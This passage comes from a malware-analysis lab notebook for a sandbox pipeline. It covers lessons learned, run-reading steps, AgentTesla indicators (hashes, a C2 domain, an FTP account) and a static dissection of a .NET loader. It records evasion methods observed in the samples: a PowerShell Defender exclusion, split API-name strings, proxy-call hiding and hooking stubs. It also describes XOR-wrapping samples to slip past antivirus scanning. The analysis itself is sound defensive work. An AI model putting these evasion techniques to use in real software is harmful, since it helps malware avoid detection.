bench. `SmartOptimization.dll` was identified — packer, decoy,
loading mechanism, absence of any config — from its own metadata with `pefile`,
and it retired a hypothesis the handoff had asserted for weeks. A recovered
artifact is a question answered on the bench, not a reason to run the VM again.

**A size is a size in some layout.** `SizeOfImage` describes a mapped image;
the section table describes a file; a payload in memory can be in either shape,
and a complete artifact measured against the wrong one reports itself as
damaged. Three explanations were tried for a 24 KB shortfall — a late dump, a
split memory range, a truncated read — before the answer turned out to be that
nothing was missing. When a measurement says something is incomplete, check what
it is being measured against before going looking for the rest.

**Absence from one list is not absence from the machine.** The carver's first
strong finding was six copies of ntdll, missing from a suspended process's
module list because the loader had not populated it yet. The check was sound and
the conclusion was wrong: "not in this list" meant "this list is incomplete", not
"foreign". Where a second source can confirm — another dump, another process,
another moment — ask it before calling something unaccounted for.

**A signal that fires on everything says nothing about anything.** The PE carver
reported eleven unmapped images in an idle Python process, all of them real and
all of them Windows resource files. Correctness was never the problem; the claim
was. Before trusting a new detector, run it against something known-clean — and
if it is a parser, against a file the operating system wrote rather than one
this repository built, because a synthetic fixture only contains what its author
already thought of.

**One error code, three different events — an emulator's fault is a statement
about the emulator as well as about the code.** `UC_ERR_FETCH_UNMAPPED at eip 0x0`
occurred three times in one afternoon and meant something different each time: a
genuine fault at the WOW64 transition, whose slot the harness had never filled; a
stack left corrupted by an *unhandled export ten million blocks earlier*, whose
arguments the caller then returned into; and the entry function **returning
normally**, popping a zero because nothing puts a sentinel on the initial stack.
Only the first is the payload's doing, and the error string is identical for all
three. They are separated by state — ESP against its starting value, EAX against
the service-number table — not by the code the emulator hands back. So: when a
harness reports a failure, ask what the harness contributes to it before reading it
as a finding about the sample, and make each cause say its own name at the moment it
happens. An unhandled API that leaves the stack wrong must announce itself where it
occurs, because the crash it causes appears somewhere else entirely.

**Anything computed downstream of an invented input is a statement about the
harness.** The mutex name `69971SRS6S-C1D59` was written into this document as
"the first hard IOC this chain has produced". It is derived from the username,
and the harness was answering `USERNAME` with `STATUS_VARIABLE_NOT_FOUND` — so
the published IOC was a description of a gap in the emulator. Answering the
variable changed the name; changing the username changed it again. The warning
had already been written *in this document*, one section earlier, about the
process list, and it did not stop the mistake, because the process list was
visibly invented and an unanswered API call did not feel like an input at all.
**A refusal is an input.** Before publishing an observable, ask what it is a
function of, and if any part of that chain is the harness's, publish the
*shape* rather than the value — a 16-character per-victim mutant is a real
finding; the particular sixteen characters were noise.

**A check can be aimed at the right subject, be capable of failing, and still be
run in a state where the behaviour it looks for cannot occur.** This is the third
turn of the screw on that rule, and the sharpest. The question was whether the
sample repairs `Wow64Transition` in its own ntdll copy or whether the harness had
invented that value. Watching for the repair *while the harness was supplying it*
could only ever record silence — a self-repair guarded by `if slot == 0` never
executes, and the resulting nothing is indistinguishable from a sample that never
looks. The fix was to **withhold the suspect value first** and then watch, which
turned an unfalsifiable negative into a measured positive: the payload does the
fixup, at `0x202f457`, and the harness's fill was redundant. *When testing whether
your own scaffolding is load-bearing, take it away — a support that is never
stressed cannot be shown to be unnecessary.*

**Intercept where the code operates, not where the API is named.** Every name in
stage 3's decoded capability set was an `Nt*` form, it read a pristine `ntdll` off
disk, and it resolved everything by hash — three separate signs, all pointing at the
same thing, that a hook on export addresses would see none of it. It took the run
going quiet at 87 calls to act on them. The boundary a payload cannot avoid is the
one worth standing at: it has to reach the kernel eventually, whatever it does to
user mode on the way. The corollary is cheap and general — *the layer everything must
pass through is a better instrument than the layer with the convenient names.*

**A change is not in the run until the guest has it, and the summary is what
says.** The 06 Aug 20:23 detonation was set up specifically to exercise the
registry-read pass and exercised none of it: the guest was one commit behind and
the config field still pointed at the default. The report looked completely normal
— `capture_quality: good`, every predicted number landing — because a *missing*
pass produces no warning, only an absent key.

**The cause was one step further back than it first looked**, which is the more
useful half. The work had been committed on the host and never **pushed**: the
guest's `origin/main` sat at `9df8ec0` because that is what the remote held, so its
pull was correct and returned nothing. `git log -1` in the guest names the code
that ran and would have caught it in one line. The chain is
`commit → push → revert → pull → disarm → detonate`, and it is an order rather
than a list — a pull before the revert is discarded with everything else, and a
pull before the push fetches the old commit and looks identical to success.

So: before reading a run as evidence about a new feature, check the guest's HEAD
before launching, and grep the summary for the field that feature writes
afterwards. Both are seconds; the run they save is five minutes plus a revert.

**A missing signal may be missing upstream of the code.** This document said for
weeks that registry reads were absent because `INTERESTING_OPS` did not list
`RegQueryValue`. True, and not the blocker: the Procmon config includes sixteen
operations and drops everything else *at capture*, so the parser was never given
one to classify. The same shape as Sysmon Event 25 being commented out in
SwiftOnSecurity's config — the pipeline was correct and the telemetry was not
there. Before writing a detector for something never observed, check that the
collector was asked for it, and check the tool's own live configuration rather
than the file that is supposed to describe it.

**Generate the binary config, do not click it.** `.pmc` files, snapshot settings
and GUI-set options are all changes with no diff and no record of what they
were. The registry-read config is produced from the default by
`procmon_config.py`, so the difference between the two is a line of code that
review can see — the same reason `bootstrap_tools.ps1` now applies the two
load-bearing guest settings instead of leaving them in a snapshot.

**Commit messages carry the evidence.** Every fix names the run that exposed it
and the numbers involved. `git log` is the incident record.

---

## Reading a run

Order to check things in, learned the hard way:

1. **`network_isolation.level`** from the run summary. `ok` now means contained;
   `uncontained` blocks the run outright. The GUI's line now re-reads every 4s
   while the window is open, as well as immediately before each launch, so
   arming or disarming the guest updates the strip and the armed banner without
   reopening the window. The summary is still the authority.
2. **Warnings first.** Degraded Collection, Cannot Be Reached, Name Resolution
   Was Not Served, Observation May Be Incomplete. Each one means part of the
   run is unobserved rather than quiet.
3. **`Capture` column** on the dumps. `Live (smeared)` qualifies every YARA
   result from that image. A PID appearing twice, once `process-spawn` and once
   `spawn-redump`, is a before/after pair — a size jump between them is a
   payload being written in. **`parent-at-spawn` is the row to look at on a
   loader**: that image was taken at the instant the process started a child,
   which is when it is holding the stage it is about to write. And read the
   skipped list for `offset(s) ... still pending` — an image nobody took is not
   an image that held nothing.
4. **Evidence Behind The Verdict.** Which categories fired and which were judged
   strong. The score is descriptive; this is the reasoning. If a Sysmon-driven
   category is in there, check *Sysmon Events From Other Processes* and the
   `Lineage resolved` row before believing it — an event from outside the tree
   carried a whole band once.
5. **Crashes In The Sample's Tree.** A fault outside any mapped module is
   injection evidence, and often the only record of hollowing. Read it together
   with **Virtual-Machine Artifacts The Sample Read** — a crash after a
   guest-additions check is a different run from a crash after nothing. That
   section says `Not Collected` unless the run used
   `dynamic_registry_reads.pmc`, and that is a statement about the config.
6. **Executables The Loader Never Mapped.** Structural, so it works where a
   signature does not: the 05 Aug payload matched no rule in the set and was
   conclusive from its headers. Read the two timestamps side by side — an image
   years newer than the process hosting it did not ship with it — **but a matching
   timestamp proves nothing**, and quietly: stage 3 of `422e30ed…` carries
   `RegSvcs.exe`'s own `0x5ff2b99b`, so on that sample the comparison is defeated by
   construction. The structural findings here do not depend on it. Then read *What
   Each Dump Held* underneath it: a zero in `Unmapped` on a hollowed process only
   means "no payload" if `Known module` is zero there too.
7. **Memory-only rules.** The actual finding on a packed sample — but an
   obfuscated payload can be present and match nothing, which is exactly the
   case the row above covers.
7. **Spawned vs Background processes.** The first is the sample; the second is
   Windows.
8. **Files Received By The Simulated Internet**, and `memory\crash_dumps\`. If
   either is non-empty, that is the run's best artifact — export before
   reverting.

---

## AgentTesla reference data

The fully-worked case. Any regression shows up as a change here.

| | |
|---|---|
| SHA256 | `31a762fdce1008e635a5e6486d7bc50b4bce671c9232006216e70cd8f2a4a7fb` |
| C2 | `ftp.cyberflor.co` |
| FTP credential | `michi@cyberflor.co` |
| Memory-only rules | `Windows_Trojan_AgentTesla_d3ac2b2f`, `Windows_Trojan_AgentTesla_ebf431a8`, `Windows_Generic_Threat_808f680e` |
| Exfil shape | FTP control `:21`, passive data `:60000-60010` |
| Report format | `Time:/User Name:/Computer Name:/OSFullName:/CPU:/RAM:` then `Host:/Username:/Password:/Application:` blocks split by `<hr>` |
| Score | 85 · Likely Malicious / High, replayed from the real summary |

Expected on a clean run: **5** dumps all `Frozen`, scheduled offsets matching
**1** rule, spawn and exit dumps matching **4**, and `ftp.cyberflor.co` from the
sample with FTP control `:21` and passive data in `:60000-60010`.

> **Updated 18 Aug from run `c175a970`, and the old numbers are kept because
> the change is the finding.** This block used to read *4 dumps, scheduled
> offsets matching 0 rules, spawn and exit dumps matching 3*. All three moved
> for reasons that are not regressions: the fifth dump is the `spawn-redump`
> trigger, which did not exist when the expectation was written, and the extra
> rule in every dump is **this project's own**
> `RingForge_Split_API_Injection_Loader`, which could not have matched before
> the local rules first reached a guest baseline on 16 Aug. See `0bj`.

The report format is itself a durable signature — a YARA rule could be written
against a captured upload rather than against the binary. The 03 Aug upload was
recovered by hand from `tools/fakenet/defaultFiles/FakeNet.html` before the
baseline was rebuilt, and is the reference artifact for that format.

---

## Loader reference data (`422e30ed…`)

Labelled Formbook by MalwareBazaar. **That attribution is unverified** — no
artifact from any run names a family.

| | |
|---|---|
| SHA256 | `422e30edd409936c649905ba4a8f58ed533287da77965268342ec38221d28231` |
| Chain | sample → `powershell.exe Add-MpPreference -ExclusionPath <self>` → 3× `RegSvcs.exe` within 15 ms |
| Outcome | one `RegSvcs` faults `0xc0000005` in unmapped memory; the others die inside one poll interval |
| Dormancy | +20, +24, +42, +48, +60s across seven runs — still widening |
| Score | 70 · Elevated Attention / High — `process_injection` (strong) + `scripted_execution` |
| Payload | x86 .NET EXE, 57,344 bytes, compiled 2025-06-18, at dump offset `0x4a6a7` |

**The payload was recovered on 05 Aug**, from the WER crash dump rather than any
scheduled dump. A foreign .NET assembly is mapped inside `RegSvcs.exe` alongside
the real image — RegSvcs's own header carries timestamp `0x5ff2b99b`, matching
what the Application Error reported, and the second carries a 2025 one. **That
is process hollowing confirmed by the PE headers, independently of any
detector.**

**It has no plaintext indicators at all.** 428 strings in the payload region:
no URLs, no domains, no IPs, no credential or wallet paths, no persistence
strings, no family markers. That is why YARA matched nothing across nine images
while the UPX control passes — there is nothing for a signature to key on, and
the ruleset is not at fault.

**That was true of this 57 KB image and false of the chain, and the difference
matters.** The 892 KB stage recovered on 07 Aug carries the entire injection API
set as UTF-16 literals — split into fragments so that a string search finds
nothing. `'Virtual ' + 'Alloc'`, `'Write ' + 'Process ' + 'Memory'`,
`'kernel ' + '32.dll'`. There *was* something for a signature to key on; it was
in a stage nothing had recovered yet. `tools\yara\local\ringforge_split_api_loader.yar`
now keys on the fragments. See *The 892 KB stage*.

**What that payload actually is — settled by static analysis, 06 Aug.** The
carved image (`SmartOptimization.dll`, 57,344 bytes, x86 .NET) was parsed with
`pefile` on the host. Its metadata `#Strings` heap decides it:

- **Packed with SmartAssembly**, a commercial .NET protector — the namespaces
  `SmartAssembly.Attributes`, `.Delegates` and `.HouseOfCards` are its
  signature. This is the "obfuscation" every prior run described.
- **The visible program is a sliding-puzzle game.** Its managed resource holds
  a full Windows Forms UI — `tileButton`, "Puzzle solved!", "Moves:", a
  File/Edit menu. A complete benign application used as the decoy carrier.
- **The loader primitives are all present**: `System.Reflection.Emit`,
  `GetManifestResourceStream`, `FromBase64String`, `Invoke`/`BeginInvoke`. It
  pulls a resource, base64-decodes it and invokes it reflectively.

**The config is not in this image, and the old hypothesis was wrong.** The
handoff said for weeks that "the config lives in a 2,380-byte `.rsrc` blob, a
static-analysis job on the carved image." Checked directly: the win32 `.rsrc` is
1,122 bytes of forged version info, the one managed resource is 4,267 bytes of
puzzle-game UI strings, `.text` entropy is 5.90 and there is no high-entropy blob
anywhere — no embedded encrypted stage 3. The Remcos config lives in the stage
this loader would reflectively invoke, which the crash prevents. That is the
single explanation for every prior observation: no C2, no Run key, no dropped
file, and no YARA match on any image.

**This explains three runs of empty findings.** The chain dies at stage 2: the
loader hollows `RegSvcs`, stage-2 starts, and it faults before decrypting stage
3. There was never going to be a C2 connection, a Run key or a dropped file.
Persistence and dropped-files sitting at `0` for this sample is a property of
the sample, not a gap in the pipeline.

**The crash is deterministic** — same chain, same failure point, three runs. Not
flaky hollowing, and not Defender, which has real-time protection off. What
remains is anti-analysis or a broken crypter, and the pipeline cannot currently
tell those apart (gap 4).

### The 07 Aug 14:53 run — gap 4b collected, and every hit was Windows

`run_id 5457f804`, 281s, **224,529** Procmon events, 13 dumps. The tenth run of this
sample, and the first ever to capture a registry read.

**The generated `.pmc` works.** `procmon_filter` records
`dynamic_registry_reads.pmc`, `captures_registry_reads: true`, 18 operations, and
`procmon_summary` shows **`registry_read: 143,805`**. That was the one assumption behind
the whole `.pmc` writer that could not be tested on the host — Procmon accepts a config
this repo generated.

**The volume cost is mild and now measured.** 224,529 events against about 100,000 on
the previous runs, 2.2x — and **281 seconds total**, inside the 252-to-316 band of the
runs before it. The teardown blowup the UPX control made everyone expect did not
happen. A read-capturing run costs roughly double the events and almost nothing in
wall-clock at this window length.

**Gap 4b's finding path fired, and produced nine hits that were all benign.**
74,174 reads by the sample's tree, 69,631 by everything else, and 9 artifacts read:

| Reader | What it read | What it actually is |
|---|---|---|
| `WerFault.exe` (7180) | `SystemManufacturer`, `BIOSVersion`, `SystemProductName`, the BIOS key, `SystemSKU` | Error Reporting collecting machine identity **for its crash report** |
| `powershell.exe` (7688) | `Services\VBoxSF\NetworkProvider` — `name`, `Class`, `ProviderPath` | Windows walking the **network-provider chain**, which any UNC lookup does |

**The sample's own process (5412) and both `RegSvcs` (2932, 9260) read none of them.**
So the answer to gap 4's active question, for this sample, is a **negative**: it does
not check for a VM. That independently corroborates the static finding, where no VM,
sandbox or debugger token appears anywhere in stage 2 in either encoding.

**Two defects, both fixed, and both the same shape.** Lineage says a process belongs to
the sample's tree; it cannot say the *behaviour* belongs to the malware.

- **`WerFault` is Windows reacting to the sample**, not the sample acting. It is in the
  tree because `RegSvcs` spawned it, entirely correctly. `WINDOWS_RESPONSE_PROCESSES`
  now sets those reads aside and counts them. This is the second pass bitten by WER
  lineage — the first is the network-attribution note under *Smaller*.
- **`\services\vboxsf` was too broad.** The `NetworkProvider` subkey is a registration
  Windows enumerates for itself. `ROUTINE_SUBPATH_MARKERS` sets that subkey aside while
  the driver's service key stays a VM check, with a test asserting the narrowing did not
  cost the signal.

Replayed through the fix: **9 hits to 0**, five counted as Windows-response and four as
routine, the note becoming "read none of the known virtual-machine artifacts", and a
synthetic read of `Services\VBoxSF` by the sample itself still firing `vm_specific`.

**Sysmon highlight lineage, proven on a live run.** `other_process_events_excluded: 14`,
`lineage_resolved: true`, `high_severity_count: 0`, and no
`credential_access_or_tampering` — the `dwm.exe` false positive that moved a band did
not recur. Score **70 · Elevated Attention**, `process_injection` strong plus
`scripted_execution`, exactly as the previous nine runs.

**The parent-at-spawn skip record fired for the first time, and it is the only reason
this run is explicable:**

    pid 5412 ... "parent exited before it could be imaged at the spawn of pid 7688"

Dormancy was **+34s**; the root spawned PowerShell and was gone inside one poll
interval. So there is **no 892 KB stage 2 in this run at all** — and therefore the
split-API YARA rule had nothing to match. It scanned 13 dumps totalling 976 MB for **0
matches and 0 false positives**, which is a passed false-positive test rather than a
detection test.

That is the important operational note on `parent-at-spawn`: it worked on the run where
the parent outlived its own spawn and recorded a miss on the run where it did not. The
896 KB image is reachable roughly half the time on this sample, and there is no setting
that changes it — the parent is either alive when the child appears or it is not.

Dormancy across ten runs: **+20, +23, +24, +34, +42, +48, +60s.**

### The 07 Aug 04:41 run — the parent dump paid off, and a band was not earned

`run_id f3d26e46`, 316s, 108,872 Procmon events, 11 of 11 dumps succeeded. The
ninth run of this sample, and the first with `parent-at-spawn` in it.

**A payload no offset has ever caught.** The trigger fired three times — the root
at t36 as it started `powershell.exe`, `RegSvcs` 11164 at t66 as it started
`WerFault`, and `powershell.exe` at t66 as it started `conhost`. In the root's
`_atspawn` image, at `0x5fa0000`:

| | |
|---|---|
| Size | **917,504 bytes** — 11× `SmartOptimization.dll` |
| Type | x86 .NET, `layout: file`, `truncated: false`, `regions_spanned: 1` |
| `TimeDateStamp` | `0x6a7171fc` → 2026-08-04 |
| SHA256 | `e139c422121c32d68424f57e55b410d6c4a40376f4316bd9f2d2b43b77b80a2b` |

**It is in the spawn-moment image and in no other.** The same process's scheduled
dumps report `unmapped: 0` at t1 and `unmapped: 1` at t25, the latter holding only
`SmartOptimization.dll` — whose SHA256 (`7672ecef…`) is identical in the t25 and
t36 images, which is a clean cross-check that the carve is not inventing
anything.

The timestamps place it. The sample carries `0x6a717204`; this image carries
`0x6a7171fc`, **eight seconds earlier**, while `SmartOptimization.dll` is
`0x6a71514c`, about 2.3 hours before that. Three builds in one pipeline, and the
896 KB assembly built eight seconds before the dropper that carries it. **Static
analysis on the host is the next step**, not another detonation.

**And the verdict read 90 · Likely Malicious, which was not earned.** The single
cause: `dwm.exe` raised a `CreateRemoteThread` whose `TargetImage` Sysmon could
not resolve. `_OS_INJECTION_PAIRS` holds `("dwm.exe", "csrss.exe")` for exactly
this case and cannot match `("dwm.exe", "")`, so the event became the run's only
high-severity highlight, `high_severity_count: 1` made
`credential_access_or_tampering` present in its own right, and the score went
70 → 90, Elevated Attention → Likely Malicious, on the Desktop Window Manager
compositing the screen. Replayed through the fix: `high_severity_count` 0, the
category absent, **70 again** — which is what the previous eight runs said.

**The cause was structural and is the fourth instance of one bug.** The highlight
pass tested for the analyzer's tooling, for two exact OS injection pairs and for
noise DNS, and everything falling through those three lists became a finding about
the sample. It had no lineage at all. `summarize_sysmon_events` now takes
`descendant_pids`, judged on the *acting* PID — `SourceProcessId` for events 8 and
10, because reading `ProcessId` there would attribute an injection to the process
injected into. Events from outside the tree go to `other_process_highlights` with
`other_process_events_excluded` and `lineage_resolved` beside them, and the report
lists them under *Sysmon Events From Other Processes*. The `msftconnecttest`
lookups that were sitting in the sample's DNS list are the same hole at low
severity, and go the same way.

**What else this run showed.** Dormancy **+36s**. The two `RegSvcs` were **11
seconds apart** (04:42:29.11 and 04:42:40.27) rather than the 15 ms of every
previous run, and the first died before it could be dumped. Every `RegSvcs` image
again reported `unmapped: 0` — spawn, `_atspawn`, the second `RegSvcs`, and the
crash dump — each with `known_module: 2`, so the zeroes are qualified but
consistent with gap 5's revised reading. The offsets-pending record correctly
stayed **silent**: the root outlived both offsets, so nothing was pending when it
exited. And `procmon_filter` settled the question the previous run could not —
`config_path` named `dynamic_default.pmc` with `captures_registry_reads: false`,
so the `.pmc` writer is not implicated and the field simply had not been switched.
Registry reads uncollected for a third run.

### The 892 KB stage — identified on the bench, 07 Aug

> **The assembly was lost once and re-acquired.** Deleted by hand from `Downloads`
> on 07 Aug, then recovered on the first re-run (`20a9aaf8`, 15:45): dormancy +33s,
> the root outlived its own spawn, and `parent-at-spawn` at t33 held both
> `SmartOptimization.dll` and the 892 KB stage 2. Same SHA256. Even odds per run
> held.
>
> **Then Bitdefender ate three copies of it.** It resumed on its own mid-session
> and deleted the external-drive backup, the working copy and de4dot's cleaned
> output, matching on content rather than extension so `.bin_` gave no protection.
> Only the original export survived. It now lives XOR-wrapped as
> `stage2_assembly_e139c422.xor9` in `G:\ringforge-artifacts\422e30ed_stage2\`,
> with the key and the unwrap snippet in that folder's README. That defeats content
> scanning without an AV exclusion, which is the trade this bench should default to.

### What the resources actually are, and what the recovered key is not

Named from the `ManifestResource` table rather than inferred from size — the
inference is what wasted an afternoon:

| Resource | Size | What |
|---|---|---|
| `StrategyEnumerator.SegmentedInitializer` | 9,448 | the proxy token map |
| `na3PRqPuA2.resources` | 284,891 | **the payload** |
| `InterruptibleInitializer.InitializerCompiler` | 14 | the string table |
| four `.resources` sets | — | WinForms decoys |

**The string table is fourteen bytes.** So the protector's string encryption is
essentially unused in this build, and the `#US` literals already recovered are the
real strings — which is consistent with the injection API fragments sitting there
in clear.

**de4dot reports "Unknown Obfuscator"** but its generic pass still cut the key
builder from 12,448 to 7,730 bytes of IL. Built from source; see the environment
facts for the two workarounds.

**Both opaque predicates are constant**, which defeats the flattening entirely:
`ConfigureVisualEditor()` is `ldnull; ret` and `ResetCompressor()` is
`null == null`. Every branch in the 345-state dispatcher is therefore decidable,
and the builder can be *executed statically* rather than read. Doing that produced:

    key  683c76f39b6f126273b4fec6a679aa5b12d381cc28b221e2d48540f2622118f7
    iv   3ce634d0fa58d49ac80cedbdad63e611

**Those are real and they are the wrong target.** They belong to the fourteen-byte
string-table path and decrypt none of the resources. Worth stating plainly because
the technique is sound — a wrong *target* is a much better position than a wrong
key.

**Where the payload actually hides.** `na3PRqPuA2` is a `.resources` **set**, so it
is read through `ResourceManager.GetObject` and not `GetManifestResourceStream` —
which is why searching for the latter kept finding only protector runtime. That
call is proxy-bound, and nothing calls the proxy wrappers directly either; they sit
behind further proxies.

**DONE, 09 Aug, and it reached the payload.** The inverse index is built, the call
graph is rebuilt, the decryptor is found and `na3PRqPuA2` is decrypted. See *The
call graph, rebuilt* below. The prediction that it would de-obfuscate the whole
assembly's control flow rather than only this question held: one root method,
`#249 BuildModule`, turned out to reach the entire capability set.


The image the parent-at-spawn dump recovered, read with `pefile` on the host. The
most informative artifact this project has produced.

| | |
|---|---|
| SHA256 | `e139c422121c32d68424f57e55b410d6c4a40376f4316bd9f2d2b43b77b80a2b` |
| Size | 892,416 bytes in **file layout**; `SizeOfImage` is 917,504 |
| Type | x86 .NET **DLL** — `_CorDllMain`, `mscoree.dll` its only import, ILONLY + 32BITREQUIRED, metadata `v2.0.50727`, unsigned |
| Compiled | 2026-08-04 05:00:44 UTC — **eight seconds before the dropper** (`0x6a717204`) |
| Forged as | `MemCompress Pro` by `RAMTech Solutions`, "Advanced Windows memory compression and optimization service", v5.3.9.3748 |

Note the size pair: 892,416 is what the carve wrote and what the file on disk
holds, against a `SizeOfImage` of 917,504. That is the file-versus-mapped
distinction working — a payload in file layout, measured against file layout, and
reported complete rather than truncated.

**The decoy is a whole fake application.** 2,675 of 5,499 metadata strings are
generated three-word CamelCase identifiers — 359 begin `Configure`, 359 begin
`Set`, 575 end `Initializer` — under namespaces `MemCompress.Selections`,
`MemCompress_Pro.Compression`, `MemCompress_Pro.UserManagement` and a dozen more.
The WinForms designer resources are real: dialogs with Cancel buttons, a progress
bar, an edit menu with cut/copy/paste/undo/redo bitmaps, a tray icon. The *real*
code is renamed to unicode box-drawing characters and sits alongside the readable
decoy. Same trick as the puzzle game, eleven times the size, and a different
invented identity — `SmartOptimization.dll` forged **Microsoft**, this forges a
plausible third-party utility vendor. The theme, system optimisation, does not
vary.

**The injection engine, in its own strings.** The API names are present as UTF-16
literals, split so a search finds nothing:

`'Virtual ' + 'Alloc'` · `'Write ' + 'Process ' + 'Memory'` ·
`'Open ' + 'Process'` · `'Virtual ' + 'Protect'` · `'Close ' + 'Handle'` ·
`'kernel ' + '32.dll'` · `'Find ' + 'ResourceA'`

reassembled at runtime and resolved with `GetDelegateForFunctionPointer`, which is
how a managed loader calls a native export with no P/Invoke declaration for a
scanner to find. **That is process injection confirmed from the payload's own
contents**, independently of the crash evidence and of the carver.

**And the stage nobody has seen.** One encrypted resource, `na3PRqPuA2`, beside
`System.Security.Cryptography.AesCryptoServiceProvider`:

- **284,673 bytes.** Entropy 7.998, all 256 byte values present with a flat
  histogram. This was read as "1 flag byte + exactly 17,792 AES blocks", and that
  was **wrong** — it is not AES and there is no block structure. 284,672 divides
  by 16 the way any even-sized buffer might, and dividing by the block size of a
  cipher is not evidence that the cipher is in use. See *The call graph, rebuilt*.
- Its resource reader is mscorlib **4.0.0.0** while every decoy UI resource is
  **2.0.0.0**. Two toolchains in one assembly, which is a detectable artifact in
  its own right and is in the rule below.
- A second 9,448-byte blob at entropy 7.979 with no resource-set header is almost
  certainly the encrypted string table, which is why the resource name itself does
  not appear as a literal.

**The key is not recoverable from the strings, and the strings are a trap.** The ten
random `#US` literals were tried as keys — UTF-8 and UTF-16, raw and MD5 and SHA-256,
128/192/256-bit, ECB and CBC with zero and prefix IV, against both `payload[1:]` and
the aligned whole: **792 combinations, no MZ and no printable block.** Then the IL said
why. See *Read at the IL level* below.

**And the deeper reason none of them could ever have worked**: the payload is not
encrypted with AES at all, so every one of those 792 combinations was the wrong
*algorithm*, not merely the wrong key. The `AesCryptoServiceProvider` string that
put AES on the table belongs to the protector's string layer, which sits in a
different type and is never reached from the payload path. **A cryptographic API
name in an image says the image contains that API, not that the artefact in front
of you went through it.** The call graph is what separates those two, and it did.

### Read at the IL level, 07 Aug

This started before there was a decompiler on the host — no ILSpy, no dnSpy, and no
.NET **SDK**, so `dotnet tool install -g ilspycmd` could not run — with a CLR metadata
reader written for the purpose. **That tooling is now `scripts/dotnet_meta.py`**, which
needs only `pefile` and reproduces everything below: heaps, tables, method bodies with
`ldstr` and call targets resolved, `FieldRVA` byte-array literals, managed resources,
and the proxy-map decryption with its own pass/fail self-check. 6,165 methods, 3,697
with bodies, 499 member references resolved to names.

ILSpy 11 was installed afterwards (standalone zip, .NET 10 runtime) and read the
methods the homegrown disassembler could not — anything control-flow flattened.

**An AES-256 key and IV, recovered.** `HandleSender` (method #1357) reads both from
IL byte-array literals through `RuntimeHelpers::InitializeArray`:

| | |
|---|---|
| Key | `f08ba6d11f49945e4039cac609b19afb61491d589bc7983f5b46f66aecc772c7` (field#570 @ rva `0xdb036`) |
| IV | `a8ab71a42a9541649351e3fb3f75365c` (field#577 @ rva `0xdb2d0`) |

`FlushLogger` (#1329) is the cipher factory: `Activator.CreateInstance` of
`AesCryptoServiceProvider` from System.Core 3.5, falling back to 4.0, falling back to
`RijndaelManaged`. `#1435`, which post-processes the plaintext, is a bare `ret`, so
there is no compression or second layer around it.

**But that pair is the *string* decryptor, not the payload's.** Its counterpart
`EnsureSequentialElement` (#1395) encrypts a string and returns
`Convert.ToBase64String`, using a **different** key (field#578) with
`IV = MD5(Unicode(passphrase))` via #1331. Neither configuration decrypts
`na3PRqPuA2`: tried at all 64 start offsets, then every one of 24 candidate keys
against 16 candidate IVs drawn from the field data. No MZ, no printable block.

**The literals that look like keys are inert by design.** This is the part worth
carrying forward. `CoordinateLiteralTracker` (#1336) is three instructions:

    ldstr 'UuDWeaRQUdaGi6K6'
    call  System.String::get_Length
    ret

It loads the string only to return its **length**. `HandleCentralProfile` does the
same with `'FU2kkBL96mt77LxNg3bq'`, discards it, and returns `{1, 2}`. All ten
random literals are loaded and thrown away like this. Roughly 4,000 key guesses were
spent on strings that were placed there to be guessed at — **a 16-character literal
next to an AES call is not evidence of a key, and the cheap check is one method body
rather than one brute force.**

**What the field data says this stage is.** The 16 `FieldRVA` blobs carry more than
the key:

| Field | Contents |
|---|---|
| #568 | **x64 machine code** — `mov rax, imm64` / `cmp [r8+8], rax` / `je` / `mov rax, imm64` / `jmp rax` |
| #580 | **x86 machine code** — `push ebp` / `mov eax,[ebp+0x10]` / `cmp [eax+4], imm32` / `je` / `mov eax, imm32` / `jmp eax` |
| #572 | The MD5 T-table (`d76aa478, e8c7b756, 242070db`…) — a hand-rolled MD5 |
| #574 | The SHA-256 K-table (`428a2f98, 71374491`…) — a hand-rolled SHA-256 |
| #579 | ASN.1 DigestInfo prefix for MD5, OID 1.2.840.113549.2.5 |
| #567, 569, 571, 573, 576, 581 | `Equals`, `GetValueOrDefault`, `get_HasValue`, `ToString`, `get_Value`, `GetHashCode` as UTF-16 byte arrays — reflection lookups |

Two architecture-specific trampoline stubs are the notable pair: a managed assembly
has no ordinary reason to carry raw machine code shaped as compare-then-jump with
placeholder immediates, and carrying both an x86 and an x64 version means it expects
to run in either. That is consistent with inline hooking. **It is not called an AMSI
bypass here, because the string `amsi` does not appear anywhere in the image in
either encoding** — the hook target is unidentified and guessing it would be the same
mistake as the key literals.

**`RecordAutomatedBuilder` (#1335) is not the payload loader** — an earlier version of
this section said it held the payload's framing and key selection, and that was wrong.
ILSpy, once installed, showed it to be the protector's own runtime: it reads a resource
`StrategyEnumerator.SegmentedInitializer`, decrypts it to a `Dictionary<int,int>` of
field token to method token, and binds a delegate to every static field of the
requested type — `Delegate.CreateDelegate` for statics, a `DynamicMethod` with
`Tailcall` for instance methods, bit `0x40000000` selecting `callvirt` over `call`.
That is **proxy-delegate call hiding**, and it is why the call graph looked so thin.

### The proxy map, decrypted

`scripts/dotnet_meta.py --proxy-map` does it. **1,181 bindings, and all 1,181 keys are
valid Field tokens** — which is the self-check: a wrong keystream fails it on the first
pass. Targets split **885 internal** `MethodDef` and **296 external** `MemberRef`, over
266 distinct members. Two independent counts agree that this is the right resource: the
blob is 9,448 bytes, exactly 1,181 × 8, and the assembly holds exactly 1,181 methods
named `ConfigureSortedElement` — the proxy stubs.

**There is no key.** Every constant in the keystream is hardcoded and the state starts
at zero, so the map is computable from the carved image alone.

**What the hidden calls are.** None of this was visible before, because call hiding
strips the tokens from every caller — these are capabilities present in the binary, not
observed behaviour:

| | |
|---|---|
| Download | `WebClient::DownloadFile` |
| Persistence | `RegistryKey::CreateSubKey`, `SetValue` ×2, `OpenSubKey`, `GetValue` |
| File | `File::Copy`, `Exists`, `CreateText`, `WriteAllText`, `Path::GetRandomFileName`, `FileSystemInfo::set_Attributes`, `FileSystemSecurity::AddAccessRule` |
| Process | `Process::Start` ×2 with `ProcessStartInfo` FileName/Arguments/WindowStyle, `GetProcesses`, `GetProcessById`, `get_Id`, `Kill` |
| Native interop | `Marshal::GetDelegateForFunctionPointer`, `AllocHGlobal`, `SizeOf` |
| Reflective load | `Assembly::Load`, `get_EntryPoint`, `ResourceManager::GetObject` |

**Three things that revises.**

- **It is a downloader as well as a carrier.** Gap 1's sample-selection reasoning turns
  on Remcos carrying everything it needs while a downloader stalls in a contained
  guest. This sample has `DownloadFile`, so containment is now a *candidate
  explanation* for why its chain dies — which had not been on the list.
- **Its persistence and drop code demonstrably exist.** "Persistence and dropped files
  sitting at 0 for this sample is a property of the sample" still holds, and now for a
  better reason: the code is present and never reached, rather than absent.
